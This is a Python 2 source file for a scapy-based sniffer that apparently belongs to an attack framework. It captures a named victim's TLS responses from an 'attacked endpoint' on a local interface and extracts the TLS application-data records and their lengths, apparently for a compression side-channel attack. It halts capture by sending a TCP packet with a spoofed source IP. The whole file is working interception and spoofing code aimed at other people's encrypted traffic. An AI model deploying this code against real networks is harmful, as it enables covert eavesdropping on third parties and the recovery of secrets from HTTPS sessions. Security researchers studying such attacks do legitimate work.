import threading
import logging
import binascii
import socket
from scapy.all import sniff, Raw, IP, TCP, send

logger = logging.getLogger('sniffer')

# TLS Header
TLS_HEADER_LENGTH = 5
TLS_CONTENT_TYPE = 0
TLS_LENGTH_MAJOR = 3
TLS_LENGTH_MINOR = 4

# TLS Content Types
TLS_CHANGE_CIPHER_SPEC = 20
TLS_ALERT = 21
TLS_HANDSHAKE = 22
TLS_APPLICATION_DATA = 23
TLS_HEARTBEAT = 24
TLS_CONTENT = {TLS_CHANGE_CIPHER_SPEC: 'Change cipher spec (20)',
               TLS_ALERT: 'Alert (21)',
               TLS_HANDSHAKE: 'Handshake (22)',
               TLS_APPLICATION_DATA: 'Application Data (23)',
               TLS_HEARTBEAT: 'Heartbeat (24)'}


class Sniffer(threading.Thread):
    '''
    Class that defines a sniffer thread object. It implements interface methods for
    creating, starting, reading the captured packets and deleting the sniffer.
    '''
    def __init__(self, arg):
        '''
        Initialize the sniffer thread object.

        Argument:
        arg -- dictionary with the sniffer parameters:
               interface: the device interface to use sniff on, e.g. wlan0
               source_ip: the local network IP of the victim, e.g. 192.168.1.66
               destination_host: the hostname of the attacked endpoint, e.g. dimkarakostas.com
        '''
        super(Sniffer, self).__init__()

        # Set thread to run as daemon
        self.daemon = True

        # Initialize object variables with parameters from arg dictionary
        self.arg = arg
        try:
            self.interface = arg['interface']
            self.source_ip = arg['source_ip']
            self.destination_host = arg['destination_host']
        except KeyError:
            assert False, 'Invalid argument dictionary - Not enough parameters'

        try:
            self.destination_ip = socket.gethostbyaddr(self.destination_host)[-1][0]
        except socket.herror, err:
            assert False, 'socket.herror - ' + str(err)

        # If either of the parameters is None, assert error
        assert self.interface and self.source_ip and self.destination_host, 'Invalid argument dictionary - Invalid parameters'

        # Initialize the captured packets' list to empty
        self.captured_packets = []

        # Thread has not come to life yet
        self.status = False

    def run(self):
        # Capture only response packets
        capture_filter = 'tcp and src host {} and src port 443 and dst host {}'.format(self.destination_ip, self.source_ip)

        self.status = True

        # Start blocking sniff function,
        # adding each sniffed packet in the 'captured_packets' list
        # and set it to stop when stop() is called
        sniff(iface=self.interface,
              filter=capture_filter,
              prn=lambda pkt: self.captured_packets.append(pkt),
              stop_filter=lambda pkt: self.filter_packet(pkt))

    def filter_packet(self, pkt):
        # Log the captured packet summary
        logger.debug(pkt.summary())

        # Return False if sniffer is still alive
        return not self.is_alive()

    def process_packet(self, pkt):
        logger.debug(pkt.summary())
        self.captured_packets.append(pkt)

    def is_alive(self):
        # Return if thread is dead or alive
        return self.status

    def get_capture(self):
        # Get the data that were captured so far
        capture = self.parse_capture()

        return capture

    def stop(self):
        # Kill it with fire!
        self.status = False

        self.stop_packet()

    def stop_packet(self):
        '''
        Send a dummy TCP packet to the victim with source IP the destination host's,
        which will be caught by sniff filter and cause sniff function to stop.
        '''
        send(IP(dst=self.source_ip, src=self.destination_ip)/TCP(sport=443), verbose=0)

    def parse_capture(self):
        '''
        Parse the captured packets and return a string of the appropriate data.
        '''
        payload_data = b''

        # Iterate over the captured packets
        # and aggregate the application level payload
        for pkt in self.captured_packets:
            if Raw in pkt:
                payload_data += str(pkt[Raw])

        return self.get_application_data(payload_data)

    def get_application_data(self, payload_data):
        '''
        Parse aggregated packet data and keep only TLS application data.

        Argument:
            payload_data - binary string of TLS layer packet payload

        Returns a string of aggregated binary TLS application data,
        including record headers.
        '''
        application_data = ''

        while payload_data:
            content_type = ord(payload_data[TLS_CONTENT_TYPE])
            length = 256 * ord(payload_data[TLS_LENGTH_MAJOR]) + ord(payload_data[TLS_LENGTH_MINOR])

            # payload_data should begin with a valid TLS header
            if content_type not in TLS_CONTENT:
                logger.warning('Invalid payload: \n' + binascii.hexlify(payload_data))

                # Flush invalid captured packets
                self.captured_packets = []
                assert False, 'Captured packets were not properly constructed'

            logger.debug('Content type: {} - Length: {}'.format(TLS_CONTENT[content_type], length))

            # Keep only TLS application data
            if content_type == TLS_APPLICATION_DATA:
                application_data += payload_data[TLS_HEADER_LENGTH:TLS_HEADER_LENGTH + length]

            # Parse all TLS records in the aggregated payload data
            payload_data = payload_data[TLS_HEADER_LENGTH + length:]

        return application_data
